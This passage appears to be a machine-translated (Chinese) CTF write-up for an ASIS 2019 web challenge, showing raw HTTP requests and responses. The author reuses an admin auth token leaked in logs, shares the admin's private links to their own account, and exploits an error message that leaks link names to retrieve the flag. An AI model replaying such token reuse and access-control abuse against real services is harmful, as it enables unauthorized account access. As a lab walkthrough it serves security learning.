application/json<br/>Content-Length: 166<br/>Connection: close</span><span id="6038" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"logs":{"log_details":"<strong class="le ir">user_id(1) created by auth_hash(7974d396f5cfcdbe3433037c11e819ca)</strong>","log_id":23,"log_name":"application log","user_id":1}}}</span><span id="4c0e" class="li lj iq le b gy ma ll l lm ln">--------------------------------------------------------------------</span><span id="9ef9" class="li lj iq le b gy ma ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Thu, 14 Nov 2019 11:47:19 GMT<br/>Content-Type: application/json<br/>Content-Length: 149<br/>Connection: close</span><span id="81d7" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"logs":{"log_details":"<strong class="le ir">user_id(1) shared a private link named test</strong>","log_id":28,"log_name":"application log","user_id":1}}}</span></pre><p id="52ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结论:</p><ol class=""><li id="6f10" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">我有了<code class="fe lo lp lq le b">auth_token</code>(1.7974d 396 F5 cfcdbe 3433037 c11e 819 ca<strong class="jp ir">)</strong></li><li id="ad64" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">我有管理员的<code class="fe lo lp lq le b">random_id</code>(来自<a class="ae lr" href="https://www.cmd5.org/" rel="noopener ugc nofollow" target="_blank"> cmd5 </a>的493291123)</li><li id="690f" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">管理员给了我一个<code class="fe lo lp lq le b">link_name</code></li></ol><p id="fe08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我开始通过管理员<code class="fe lo lp lq le b">auth_token</code>调用<code class="fe lo lp lq le b">My Links</code>端点:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="5fce" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 10:36:35 GMT<br/>Content-Type: application/json<br/>Content-Length: 98<br/>Connection: close</span><span id="93f5" class="li lj iq le b gy ma ll l lm ln">{"code":401,"data":{"msg":"Device-Id(c515834365310176f8117a18bb5ad994) mismatch for user_id(1)"}}</span></pre><p id="4278" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我找了2个小时才找到管理员的<code class="fe lo lp lq le b">device_id</code>，没找到。但是，我可以调用以下端点:</p><ol class=""><li id="c873" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">共享链接</li><li id="1b11" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">与用户共享私人链接</li></ol><p id="1f3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我有管理员的<code class="fe lo lp lq le b">random_number</code>、<code class="fe lo lp lq le b">link_name</code>和<code class="fe lo lp lq le b">auth_token</code>，所以我把<code class="fe lo lp lq le b">test</code>分享给自己:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="2743" class="li lj iq le b gy lk ll l lm ln">POST /api/links/share/private HTTP/1.1<br/>auth-token: 1.7974d396f5cfcdbe3433037c11e819ca<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 77<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="b0f6" class="li lj iq le b gy ma ll l lm ln">{"link_name":"test","random_number":493291123,"share_user_id": 6,"user_id":1}</span></pre><p id="f0a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="cc92" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 11:03:05 GMT<br/>Content-Type: application/json<br/>Content-Length: 101<br/>Connection: close</span><span id="f4cf" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"msg":"the user_id(6) can view the link by /api/link/preview/1/493291123/test"}}</span></pre><p id="b9b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我通过我的<code class="fe lo lp lq le b">auth_token</code>看到了链接:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="e881" class="li lj iq le b gy lk ll l lm ln">GET /api/link/preview/1/493291123/test HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 0<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="9a5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="8950" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 11:05:50 GMT<br/>Content-Type: application/json<br/>Content-Length: 66<br/>Connection: close</span><span id="a436" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"link":"<a class="ae lr" href="https://ShareL.tld/test_admin_link" rel="noopener ugc nofollow" target="_blank">https://ShareL.tld/test_admin_link</a>"}}</span></pre><p id="8644" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没有发现任何有用的东西:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="3810" class="li lj iq le b gy lk ll l lm ln">{"code":200,"data":{"test":"keep going :)"}}</span></pre><p id="887a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">管理员有5个链接，其中之一是旗帜，我有除了旗帜<code class="fe lo lp lq le b">link_name</code>的一切。我进行了许多测试，最终，我发现如果我共享一个存在于数据库中的<code class="fe lo lp lq le b">link_name</code>，端点会泄露链接名称:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="988a" class="li lj iq le b gy lk ll l lm ln">POST /api/links/share HTTP/1.1<br/>auth-token: 1.7974d396f5cfcdbe3433037c11e819ca<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 46<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span><span id="b5e2" class="li lj iq le b gy ma ll l lm ln">{"link":"test","link_name":"test","private":1}</span></pre><p id="ca22" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="9e83" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 11:08:49 GMT<br/>Content-Type: application/json<br/>Content-Length: 134<br/>Connection: close</span><span id="6a72" class="li lj iq le b gy ma ll l lm ln">{"code":400,"data":{"err":"you cannot pick the link name which has already exists ['test', 'google', '<strong class="le ir">thefl4g_Not3</strong>', 'a', 'local']"}}</span></pre><p id="9a53" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我分享了这面旗，然后读了它:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="4414" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 11:10:11 GMT<br/>Content-Type: application/json<br/>Content-Length: 61<br/>Connection: close</span><span id="b4cb" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"link":"<a class="ae lr" href="https://ShareL.tld/fL/r34d_me" rel="noopener ugc nofollow" target="_blank">https://ShareL.tld/fL/r34d_me</a>"}}</span></pre><p id="aff2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="eda6" class="li lj iq le b gy lk ll l lm ln">GET /fL/r34d_me HTTP/1.1<br/>auth-token: 6.4f9dd56abac816f917c720a7c46d4044<br/>device-id: c515834365310176f8117a18bb5ad994<br/>Content-Type: application/json<br/>Content-Length: 0<br/>Host: 66.172.33.148:5001<br/>Connection: close<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: okhttp/3.10.0</span></pre><p id="4e4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">旗帜:</p><pre class="kz la lb lc gt ld le lf lg aw lh bi"><span id="f681" class="li lj iq le b gy lk ll l lm ln">HTTP/1.1 200 OK<br/>Server: nginx/1.15.8<br/>Date: Mon, 18 Nov 2019 11:10:28 GMT<br/>Content-Type: application/json<br/>Content-Length: 70<br/>Connection: close</span><span id="fcd5" class="li lj iq le b gy ma ll l lm ln">{"code":200,"data":{"flag":"ASIS{34f9266d60f7eb45a8f29796e44853eb}"}}</span></pre></div><div class="ab cl mc md hu me" role="separator"><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh mi"/><span class="mf bw bk mg mh"/></div><div class="ij ik il im in"><p id="b50e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mj">关注</em> <a class="ae lr" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="mj"> Infosec报道</em> </a> <em class="mj">获取更多此类精彩报道。</em></p><div class="mk ml gp gr mm mn"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="mo ab fo"><div class="mp ab mq cl cj mr"><h2 class="bd ir gy z fp ms fr fs mt fu fw ip bi translated">信息安全报道</h2><div class="mu l"><h3 class="bd b gy z fp ms fr fs mt fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="mv l"><p class="bd b dl z fp ms fr fs mt fu fw dk translated">medium.com</p></div></div><div class="mw l"><div class="mx l my mz na mw nb ly mn"/></div></div></a></div></div></div>    
</body>
</html>